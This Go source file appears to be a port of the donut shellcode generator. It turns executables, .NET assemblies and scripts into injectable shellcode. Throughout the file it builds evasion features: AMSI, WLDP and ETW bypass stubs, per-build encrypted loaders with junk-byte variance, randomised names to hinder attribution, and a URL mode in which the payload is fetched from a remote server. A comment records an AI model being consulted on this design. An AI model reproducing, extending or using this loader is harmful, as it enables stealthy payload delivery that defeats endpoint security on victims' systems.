package donut

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"path/filepath"
	"strings"

	"github.com/Binject/debug/pe"
)

/*
	This code imports PE files and converts them to shellcode using the algorithm and stubs taken
	from the donut loader: https://github.com/TheWover/donut

	You can also use the native-code donut tools to do this conversion.

	This has the donut stubs hard-coded as arrays, so if something rots,
	try updating the stubs to latest donut first.
*/

// validateConfig checks options that this Go port can actually encode in the
// generated shellcode.  Keeping this check at the public entry points prevents
// unsupported values from being silently copied into the module or instance.
func validateConfig(config *DonutConfig) error {
	switch config.Entropy {
	case DONUT_ENTROPY_NONE, DONUT_ENTROPY_RANDOM, DONUT_ENTROPY_DEFAULT:
	default:
		return fmt.Errorf("donut: unsupported entropy %d: supported values are 1 (none), 2 (random names), and 3 (random names + symmetric encryption)", config.Entropy)
	}

	switch config.Compress {
	case 0, 1:
	default:
		return fmt.Errorf("donut: unsupported compression %d: supported values are 0 or 1 (none)", config.Compress)
	}

	switch config.Format {
	case 0, 1:
	default:
		return fmt.Errorf("donut: unsupported format %d: only raw output is supported (use 0 or 1)", config.Format)
	}

	// Evade mode set is intentionally minimal (P2 sweeper dropped): anything
	// other than none/hwbp must fail loudly instead of silently disabling the
	// built-in AMSI/WLDP patch without installing a replacement.
	switch config.Evade {
	case EvadeNone, EvadeHwbp:
	default:
		return fmt.Errorf("donut: unsupported evade mode %d: supported values are 0 (off) and 1 (hwbp)", config.Evade)
	}

	// Morph encrypts the loader stage; an unencrypted instance under entropy<3
	// still carries plaintext attribution strings. Warn loudly (not an error:
	// stage-level morphing with a plaintext instance is a legitimate choice).
	// Policy per gpt-6.1-sol consult (daybreak P0.3): ALWAYS-visible warning on
	// stderr naming exactly what remains attributable — never verbose-gated,
	// never a hard error (breaks legal fixtures), never an auto-upgrade
	// (overrides explicit user intent; see .research/v1.1.5-roadmap.md WP6).
	if config.Morph && config.Entropy != DONUT_ENTROPY_DEFAULT {
		log.Println("WARNING: Morph encrypts the loader stage only — the embedded instance stays PLAINTEXT at entropy < 3, keeping attributable content: API-name lists (DllNames, Amsi*, Wldp*, ExitApi), CLR/script GUIDs, and command-line symbols. Stage encryption does NOT encrypt the instance. Select entropy 3 for a fully encrypted corpus; entropy 3 is not a guarantee of anonymity or non-detection.")
	}

	return nil
}

// ShellcodeFromURL - Downloads a PE from URL, makes shellcode
func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error) {
	if config == nil {
		return nil, fmt.Errorf("donut: nil config")
	}
	if err := validateConfig(config); err != nil {
		return nil, err
	}
	buf, err := DownloadFile(fileURL)
	if err != nil {
		return nil, err
	}
	// todo: set things up in config
	return ShellcodeFromBytes(buf, config)
}

// DetectDotNet - returns true if a .NET assembly. 2nd return value is detected version string.
func DetectDotNet(filename string) (bool, string) {
	// auto-detect .NET assemblies and version
	pefile, err := pe.Open(filename)
	if err != nil {
		return false, ""
	}
	defer pefile.Close()
	return pefile.IsManaged(), pefile.NetCLRVersion()
}

// ShellcodeFromFile - Loads PE from file, makes shellcode
func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, error) {
	if config == nil {
		return nil, fmt.Errorf("donut: nil config")
	}
	if err := validateConfig(config); err != nil {
		return nil, err
	}

	switch strings.ToLower(filepath.Ext(filename)) {
	case ".exe":
		dotNetMode, dotNetVersion := DetectDotNet(filename)
		if dotNetMode {
			config.Type = DONUT_MODULE_NET_EXE
		} else {
			config.Type = DONUT_MODULE_EXE
		}
		if dotNetVersion != "" && config.Runtime == "" {
			config.Runtime = dotNetVersion
		}
	case ".dll":
		dotNetMode, dotNetVersion := DetectDotNet(filename)
		if dotNetMode {
			config.Type = DONUT_MODULE_NET_DLL
		} else {
			config.Type = DONUT_MODULE_DLL
		}
		if dotNetVersion != "" && config.Runtime == "" {
			config.Runtime = dotNetVersion
		}
	case ".xsl":
		config.Type = DONUT_MODULE_XSL
	case ".js":
		config.Type = DONUT_MODULE_JS
	case ".vbs":
		config.Type = DONUT_MODULE_VBS
	}

	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	return ShellcodeFromBytes(bytes.NewBuffer(b), config)
}

// ShellcodeFromBytes - Passed a PE as byte array, makes shellcode
func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, error) {
	if config == nil {
		return nil, fmt.Errorf("donut: nil config")
	}
	if err := validateConfig(config); err != nil {
		return nil, err
	}
	if buf == nil {
		return nil, fmt.Errorf("donut: nil input buffer")
	}

	if err := CreateModule(config, buf); err != nil {
		return nil, err
	}
	instance, err := CreateInstance(config)
	if err != nil {
		return nil, err
	}
	// If the module will be stored on a remote server
	if config.InstType == DONUT_INSTANCE_URL {
		if config.Verbose {
			log.Printf("Saving %s to disk.\n", config.ModuleName)
		}

		// save the module to disk using random name
		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0})          // mystery padding
		config.ModuleData.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0}) // mystery padding
		if err := ioutil.WriteFile(config.ModuleName, config.ModuleData.Bytes(), 0644); err != nil {
			return nil, fmt.Errorf("donut: write staged module: %w", err)
		}
	}
	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
	return sandwich(config.Arch, instance, config.Morph, config.Evade, config.EvadeTargets)
}

// Sandwich adds the canonical donut prefix and loader stub around payload.
//
// The public API intentionally retains its original two-argument signature.
// Use ShellcodeFromBytes with DonutConfig.Morph to request a morphed loader.
func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
	return sandwich(arch, payload, false, EvadeNone, 0)
}

// buildStage composes one architecture's post-instance stage:
//
//	[evade stub?] [trampoline? + core ciphertext | canonical loader]
//
// The evade stub (patchless HWBP+VEH AMSI/WLDP/ETW interception) always ends
// with a `jmp rel32` that is patched here to the byte immediately after it.
// When morph is set the canonical loader never appears in plaintext: it is
// encrypted per build (scheme+key via EncryptCore) and a generation-time
// trampoline allocates a fresh RW page, decrypts, flips RX, flushes the
// instruction cache, and transfers control with the entry contract intact.
// With morph clear the stage carries the canonical loader bytes unchanged.
func buildStage(loader []byte, morph bool, evade EvadeMode, targets EvadeTargets, gen64 bool, label string) ([]byte, error) {
	var stage []byte

	if evade == EvadeHwbp {
		opts := targets.options()
		var (
			stub []byte
			meta EvadeMetadata
			err  error
		)
		if gen64 {
			stub, meta, err = GenerateEvadeStub64(opts)
		} else {
			stub, meta, err = GenerateEvadeStub32(opts)
		}
		if err != nil {
			return nil, fmt.Errorf("donut: generate %s evade stub: %w", label, err)
		}
		if gen64 {
			if err := PatchEvadeJmp(stub, meta, len(stub)); err != nil {
				return nil, fmt.Errorf("donut: patch %s evade jmp: %w", label, err)
			}
		} else {
			// F2 fix: the 32-bit stub has its own jmp layout — patching it with
			// the x64 patcher corrupted the entry bytes (one-byte shift at fs:).
			if err := PatchEvadeJmp32(stub, meta, len(stub)); err != nil {
				return nil, fmt.Errorf("donut: patch %s evade32 jmp: %w", label, err)
			}
		}
		stage = stub
	}

	if morph {
		cipher, key, scheme, err := EncryptCore(loader)
		if err != nil {
			return nil, fmt.Errorf("donut: encrypt %s core: %w", label, err)
		}
		famInt, err := evadeRandInt(3)
		if err != nil {
			return nil, fmt.Errorf("donut: %s scheme draw: %w", label, err)
		}
		seed, err := evadeRandUint32()
		if err != nil {
			return nil, fmt.Errorf("donut: %s seed draw: %w", label, err)
		}
		if seed == 0 {
			seed = 0x9E3779B9
		}
		var tramp []byte
		if gen64 {
			tramp, err = GenerateTrampoline64(len(cipher), key, scheme, evadeHashFamily(famInt), seed)
		} else {
			tramp, err = GenerateTrampoline32(len(cipher), key, scheme, evadeHashFamily(famInt), seed)
		}
		if err != nil {
			return nil, fmt.Errorf("donut: generate %s trampoline: %w", label, err)
		}
		// NOP-equivalent junk in front of the trampoline adds cheap per-build
		// variance; RIP-relative references inside the trampoline shift with
		// it, so the [tramp][key16][cipher] layout stays self-contained.
		junked, err := insertJunk(tramp)
		if err != nil {
			return nil, fmt.Errorf("donut: junk %s trampoline: %w", label, err)
		}
		stage = append(stage, junked...)
		stage = append(stage, cipher...)
	} else {
		stage = append(stage, loader...)
	}
	return stage, nil
}

// sandwich adds the donut prefix and loader stub around payload. When morph is
// true, the loader core is present only as per-build ciphertext behind a
// generation-time trampoline (RX-safe: the emitted stage never writes to its
// own pages). A non-zero evade mode prepends the patchless HWBP+VEH stub and
// disables the loader's built-in AMSI/WLDP patching (see CreateInstance).
func sandwich(arch DonutArch, payload *bytes.Buffer, morph bool, evade EvadeMode, targets EvadeTargets) (*bytes.Buffer, error) {
	if payload == nil {
		return nil, fmt.Errorf("donut: nil payload")
	}
	/*
			Disassembly:
					   0:  e8 					call $+
					   1:  xx xx xx xx			instance length
					   5:  [instance]
		 x=5+instanceLen:  0x59					pop ecx
		             x+1:  stub preamble + stub (either 32 or 64 bit or both)
	*/

	w := new(bytes.Buffer)
	instanceLen := uint32(payload.Len())
	w.WriteByte(0xE8)
	if err := binary.Write(w, binary.LittleEndian, instanceLen); err != nil {
		return nil, fmt.Errorf("donut: write instance length: %w", err)
	}
	if _, err := payload.WriteTo(w); err != nil {
		return nil, fmt.Errorf("donut: append instance payload: %w", err)
	}
	w.WriteByte(0x59)

	const x64StagePadding = 26
	x64CoreLength := len(LOADER_EXE_X64) - 22 - x64StagePadding
	x64Wrapper := LOADER_EXE_X64[:22]
	x64Core := LOADER_EXE_X64[22 : 22+x64CoreLength]
	// Copy before appending: x64Wrapper is a slice of LOADER_EXE_X64 whose
	// spare capacity would otherwise let append overwrite the global loader.
	x84Loader := append([]byte(nil), x64Wrapper...)
	x84Loader = append(x84Loader, x64Core...)

	var targetLen int

	switch arch {
	case X32:
		preamble, err := morphPreamble(X32)
		if err != nil {
			return nil, fmt.Errorf("donut: create x86 morph preamble: %w", err)
		}
		if !morph {
			preamble = []byte{0x5A, 0x51, 0x52}
		}
		w.Write(preamble)
		stage, err := buildStage(LOADER_EXE_X86, morph, evade, targets, false, "x86")
		if err != nil {
			return nil, err
		}
		w.Write(stage)
		targetLen = int(instanceLen) + len(stage) + 32
	case X64:
		stage, err := buildStage(LOADER_EXE_X64, morph, evade, targets, true, "x64")
		if err != nil {
			return nil, err
		}
		w.Write(stage)
		targetLen = int(instanceLen) + len(stage) + 6
	case X84:
		preamble, err := morphPreamble(X84)
		if err != nil {
			return nil, fmt.Errorf("donut: create x84 morph preamble: %w", err)
		}
		if !morph {
			preamble = []byte{0x31, 0xC0}
		}
		w.Write(preamble)
		w.WriteByte(0x48) // dec eax in x86; REX.W prefix in x64 branch
		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
		w.WriteByte(0x88)

		stage64, err := buildStage(x84Loader, morph, evade, targets, true, "x84/x64")
		if err != nil {
			return nil, err
		}
		if err := binary.Write(w, binary.LittleEndian, uint32(len(stage64))); err != nil {
			return nil, fmt.Errorf("donut: write x84 x64 jump length: %w", err)
		}
		w.Write(stage64)
		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
			0x51,  // push ecx
			0x52}) // push edx
		stage32, err := buildStage(LOADER_EXE_X86, morph, evade, targets, false, "x84/x86")
		if err != nil {
			return nil, err
		}
		w.Write(stage32)
		targetLen = int(instanceLen) + len(stage64) + 3 + len(stage32) + 32
	default:
		return nil, fmt.Errorf("donut: unsupported architecture %d", arch)
	}

	for w.Len() < targetLen {
		w.WriteByte(0x0)
	}

	return w, nil
}

// CreateModule - Creates the Donut Module from Config

// CreateModule - Creates the Donut Module from Config
func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
	if config == nil {
		return fmt.Errorf("donut: nil config")
	}
	if inputFile == nil {
		return fmt.Errorf("donut: nil input buffer")
	}
	if err := validateConfig(config); err != nil {
		return err
	}

	mod := new(DonutModule)
	mod.ModType = uint32(config.Type)
	mod.Thread = uint32(config.Thread)
	mod.Unicode = uint32(config.Unicode)
	// DONUT_COMPRESS_NONE=1 in C donut (0 is invalid)
	if config.Compress == 0 {
		mod.Compress = 1
	} else {
		mod.Compress = uint32(config.Compress)
	}

	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		if config.Domain == "" && config.Entropy != DONUT_ENTROPY_NONE { // If no domain name specified, generate a random one
			domain, err := RandomStringWithError(DONUT_DOMAIN_LEN)
			if err != nil {
				return fmt.Errorf("donut: generate module domain: %w", err)
			}
			config.Domain = domain
		} else {
			config.Domain = "AAAAAAAA"
		}
		copy(mod.Domain[:], []byte(config.Domain)[:])

		if config.Type == DONUT_MODULE_NET_DLL {
			if config.Verbose {
				log.Println("Class:", config.Class)
			}
			copy(mod.Cls[:], []byte(config.Class)[:])
			if config.Verbose {
				log.Println("Method:", config.Method)
			}
			copy(mod.Method[:], []byte(config.Method)[:])
		}
		// If no runtime specified in configuration, use default
		if config.Runtime == "" {
			config.Runtime = "v2.0.50727"
		}
		if config.Verbose {
			log.Println("Runtime:", config.Runtime)
		}
		copy(mod.Runtime[:], []byte(config.Runtime)[:])
	} else if config.Type == DONUT_MODULE_DLL && config.Method != "" { // Unmanaged DLL? check for exported api
		if config.Verbose {
			log.Println("DLL function:", config.Method)
		}
		copy(mod.Method[:], []byte(config.Method))
	}
	mod.Zlen = 0 // todo: support compression
	mod.Len = uint32(inputFile.Len())

	if config.Parameters != "" {
		// if type is unmanaged EXE
		if config.Type == DONUT_MODULE_EXE {
			// and entropy is enabled
			if config.Entropy != DONUT_ENTROPY_NONE {
				// generate random name
				randomName, err := RandomStringWithError(DONUT_DOMAIN_LEN)
				if err != nil {
					return fmt.Errorf("donut: generate parameter name: %w", err)
				}
				copy(mod.Param[:], []byte(randomName + " ")[:])
				copy(mod.Param[DONUT_DOMAIN_LEN+1:], []byte(config.Parameters)[:])
			} else {
				// else set to "AAAA "
				copy(mod.Param[:], []byte("AAAAAAAA ")[:])
				copy(mod.Param[9:], []byte(config.Parameters)[:])
			}
		} else {
			copy(mod.Param[:], []byte(config.Parameters)[:])
		}
	}

	// read module into memory
	b := new(bytes.Buffer)
	mod.WriteTo(b)
	inputFile.WriteTo(b)
	config.ModuleData = b

	// update configuration with pointer to module
	config.Module = mod
	return nil
}

// CreateInstance - Creates the Donut Instance from Config
func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
	if config == nil {
		return nil, fmt.Errorf("donut: nil config")
	}
	if config.ModuleData == nil {
		return nil, fmt.Errorf("donut: nil module data; call CreateModule first")
	}
	if err := validateConfig(config); err != nil {
		return nil, err
	}

	inst := new(DonutInstance)
	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
	instLen := uint32(4760)                   // Donut v1.1 DONUT_INSTANCE size
	// A patchless evade stub replaces the loader's built-in AMSI/WLDP patch
	// entirely, so the instance must tell the stage to skip it (1 = skip).
	if config.Evade == EvadeHwbp {
		inst.Bypass = 1
	} else {
		inst.Bypass = uint32(config.Bypass)
	}
	if config.Headers == 0 {
		inst.Headers = 1 // DONUT_HEADERS_OVERWRITE (default in C donut)
	} else {
		inst.Headers = uint32(config.Headers)
	}

	// if this is a PIC instance, add the size of module
	// that will be appended to the end of structure
	if config.InstType == DONUT_INSTANCE_PIC {
		if config.Verbose {
			log.Printf("The size of module is %v bytes. Adding to size of instance.\n", modLen)
		}
		instLen += modLen
	}

	if config.Entropy == DONUT_ENTROPY_DEFAULT {
		if config.Verbose {
			log.Println("Generating random key for instance")
		}
		tk, err := GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyMk[:], tk)

		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyCtr[:], tk)

		if config.Verbose {
			log.Println("Generating random key for module")
		}
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyMk[:], tk)

		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyCtr[:], tk)

		if config.Verbose {
			log.Println("Generating random string to verify decryption")
		}
		sbsig, err := RandomStringWithError(DONUT_SIG_LEN)
		if err != nil {
			return nil, fmt.Errorf("donut: generate instance signature: %w", err)
		}
		copy(inst.Sig[:], []byte(sbsig))

		if config.Verbose {
			log.Println("Generating random IV for Maru hash")
		}
		iv, err := GenerateRandomBytes(MARU_IV_LEN)
		if err != nil {
			return nil, err
		}
		inst.Iv = binary.LittleEndian.Uint64(iv)

		inst.Mac = Maru(inst.Sig[:], inst.Iv)
	}
	if config.Verbose {
		log.Println("Generating hashes for API using IV:", inst.Iv)
	}

	for cnt, c := range api_imports {
		// calculate hash for DLL string
		dllHash := Maru([]byte(c.Module), inst.Iv)

		// calculate hash for API string.
		// xor with DLL hash and store in instance
		inst.Hash[cnt] = Maru([]byte(c.Name), inst.Iv) ^ dllHash

		if config.Verbose {
			log.Printf("Hash for %s : %s = %x\n",
				c.Module,
				c.Name,
				inst.Hash[cnt])
		}
	}
	// save how many API to resolve
	inst.ApiCount = uint32(len(api_imports))
	copy(inst.DllNames[:], "ole32;oleaut32;wininet;mscoree;shell32")

	// if module is .NET assembly
	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		if config.Verbose {
			log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")
		}
		copy(inst.XIID_AppDomain[:], xIID_AppDomain[:])
		copy(inst.XIID_ICLRMetaHost[:], xIID_ICLRMetaHost[:])
		copy(inst.XCLSID_CLRMetaHost[:], xCLSID_CLRMetaHost[:])
		copy(inst.XIID_ICLRRuntimeInfo[:], xIID_ICLRRuntimeInfo[:])
		copy(inst.XIID_ICorRuntimeHost[:], xIID_ICorRuntimeHost[:])
		copy(inst.XCLSID_CorRuntimeHost[:], xCLSID_CorRuntimeHost[:])
	} else if config.Type == DONUT_MODULE_VBS ||
		config.Type == DONUT_MODULE_JS {

		if config.Verbose {
			log.Println("Copying GUID structures and DLL strings for loading VBS/JS")
		}

		copy(inst.XIID_IUnknown[:], xIID_IUnknown[:])
		copy(inst.XIID_IDispatch[:], xIID_IDispatch[:])
		copy(inst.XIID_IHost[:], xIID_IHost[:])
		copy(inst.XIID_IActiveScript[:], xIID_IActiveScript[:])
		copy(inst.XIID_IActiveScriptSite[:], xIID_IActiveScriptSite[:])
		copy(inst.XIID_IActiveScriptSiteWindow[:], xIID_IActiveScriptSiteWindow[:])
		copy(inst.XIID_IActiveScriptParse32[:], xIID_IActiveScriptParse32[:])
		copy(inst.XIID_IActiveScriptParse64[:], xIID_IActiveScriptParse64[:])

		copy(inst.Wscript[:], "WScript")
		copy(inst.Wscript_exe[:], "wscript.exe")

		if config.Type == DONUT_MODULE_VBS {
			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_VBScript[:])
		} else {
			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_JScript[:])
		}
	}

	// required to disable AMSI
	copy(inst.Clr[:], "clr")
	copy(inst.Amsi[:], "amsi")
	copy(inst.AmsiInit[:], "AmsiInitialize")
	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
	copy(inst.AmsiScanStr[:], "AmsiScanString")

	copy(inst.EtwEventWrite[:], "EtwEventWrite")
	copy(inst.EtwEventUnregister[:], "EtwEventUnregister")
	inst.EtwRet64 = [1]byte{0xC3}
	inst.EtwRet32 = [4]byte{0xC2, 0x14, 0x00, 0x00}
	copy(inst.Ntdll[:], "ntdll")

	// stuff for PE loader
	if len(config.Parameters) > 0 {
		copy(inst.Dataname[:], ".data")
		copy(inst.Kernelbase[:], "kernelbase")

		copy(inst.CmdSyms[:],
			"_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
	}
	if config.Thread != 0 {
		copy(inst.ExitApi[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit")
	}
	// required to disable WLDP
	copy(inst.Wldp[:], "wldp")
	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")

	// set the type of instance we're creating
	inst.Type = uint32(int(config.InstType))

	// indicate if we should call RtlExitUserProcess to terminate host process
	inst.ExitOpt = config.ExitOpt
	// set the fork option
	inst.OEP = config.OEP
	// set the entropy level
	inst.Entropy = config.Entropy

	// if the module will be downloaded
	// set the URL parameter and request verb
	if inst.Type == DONUT_INSTANCE_URL {
		if config.ModuleName == "" {
			if config.Entropy != DONUT_ENTROPY_NONE {
				// generate a random name for module
				// that will be saved to disk
				moduleName, err := RandomStringWithError(DONUT_MAX_MODNAME)
				if err != nil {
					return nil, fmt.Errorf("donut: generate module name: %w", err)
				}
				config.ModuleName = moduleName
				if config.Verbose {
					log.Println("Generated random name for module :", config.ModuleName)
				}
			} else {
				config.ModuleName = "AAAAAAAA"
			}
		}
		if config.Verbose {
			log.Println("Setting URL parameters")
		}
		// append module name
		copy(inst.Server[:], config.URL+"/"+config.ModuleName)
		copy(inst.HttpReq[:], "GET")
		if config.Verbose {
			log.Println("Payload will attempt download from:", string(inst.Server[:]))
		}
	}

	inst.Mod_len = uint64(modLen) + 8 //todo: this 8 is from alignment I think?
	inst.Len = instLen
	config.inst = inst
	config.instLen = instLen

	if config.InstType == DONUT_INSTANCE_URL && config.Entropy == DONUT_ENTROPY_DEFAULT {
		if config.Verbose {
			log.Println("encrypting module for download")
		}
		config.ModuleMac = Maru(inst.Sig[:], inst.Iv)
		ctrCopy := append([]byte(nil), inst.ModKeyCtr[:]...)
		config.ModuleData = bytes.NewBuffer(Encrypt(
			inst.ModKeyMk[:],
			ctrCopy,
			config.ModuleData.Bytes()))
		b := new(bytes.Buffer)
		inst.Len = instLen - 8 /* magic padding */
		inst.WriteTo(b)
		for uint32(b.Len()) < instLen-16 /* magic padding */ {
			b.WriteByte(0)
		}
		instData := b.Bytes()
		encInstData := Encrypt(inst.KeyMk[:], inst.KeyCtr[:], instData[572:])
		bc := new(bytes.Buffer)
		binary.Write(bc, binary.LittleEndian, instData[:572])
		bc.Write(encInstData)
		return bc, nil
	}
	// else if config.InstType == DONUT_INSTANCE_PIC
	b := new(bytes.Buffer)
	inst.WriteTo(b)
	if _, err := config.ModuleData.WriteTo(b); err != nil {
		return nil, fmt.Errorf("donut: append module data: %w", err)
	}
	for uint32(b.Len()) < config.instLen {
		b.WriteByte(0)
	}
	if config.Entropy != DONUT_ENTROPY_DEFAULT {
		return b, nil
	}
	if config.Verbose {
		log.Println("encrypting instance")
	}
	instData := b.Bytes()
	offset := 4 + // Len uint32
		CipherKeyLen + CipherBlockLen + // Instance Crypt (32)
		4 + // alignment padding
		8 + // IV
		(64 * 8) + // Hashes (512)
		4 + // exit_opt
		4 + // entropy
		4 // OEP (uint32 in v1.0)

	encInstData := Encrypt(
		inst.KeyMk[:],
		inst.KeyCtr[:],
		instData[offset:])

	bc := new(bytes.Buffer)
	binary.Write(bc, binary.LittleEndian, instData[:offset]) // unencrypted header
	if _, err := bc.Write(encInstData); err != nil {         // encrypted body
		return nil, fmt.Errorf("donut: write encrypted instance body: %w", err)
	}
	if config.Verbose {
		log.Println("Leaving.")
	}
	return bc, nil
}

// DefaultConfig - returns a default donut config for x32+64, EXE, native binary
func DefaultConfig() *DonutConfig {
	return &DonutConfig{
		Arch:     X84,
		Type:     DONUT_MODULE_EXE,
		InstType: DONUT_INSTANCE_PIC,
		Entropy:  DONUT_ENTROPY_RANDOM,
		Compress: 1,
		Format:   1,
		Bypass:   3,
	}
}
